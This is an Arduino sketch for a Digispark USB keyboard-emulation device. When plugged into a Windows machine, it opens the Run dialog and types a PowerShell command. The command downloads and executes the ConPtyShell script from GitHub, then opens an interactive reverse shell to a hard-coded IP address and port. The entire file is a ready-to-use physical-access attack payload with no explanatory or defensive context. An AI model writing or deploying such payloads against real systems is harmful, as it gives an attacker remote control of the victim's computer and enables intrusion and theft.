
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.0.144 -RemotePort 4444 -Rows 24 -Cols 80;\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

    digitalWrite(1, HIGH);
    DigiKeyboard.delay(90000);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(5000);
      for (;;) {

  
  }
}
